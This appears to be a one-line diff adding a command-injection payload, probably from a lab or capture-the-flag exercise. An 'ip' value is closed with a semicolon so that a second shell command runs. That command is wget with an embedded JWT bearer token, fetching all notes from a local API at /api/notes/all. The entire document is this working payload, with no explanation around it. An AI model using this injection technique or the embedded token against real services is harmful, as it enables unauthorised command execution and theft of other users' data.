@@ -1,0 +1,1 @@
+ip=1;wget -qO- --header="Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImI0ZmE4OTg5LTIxMTItNDg4ZC05Mjk4LTViNTFkMjEwNjQ2NSIsImVtYWlsIjoiYUBhLmNvbSIsImlhdCI6MTc1OTcwODc0NSwiZXhwIjoxNzU5NzA5NjQ1fQ.lOvItfgVo9PTYiD_iy87xLl3WTiYdqQHHE09GnnMzuk" http://127.0.0.1:41412/api/notes/all
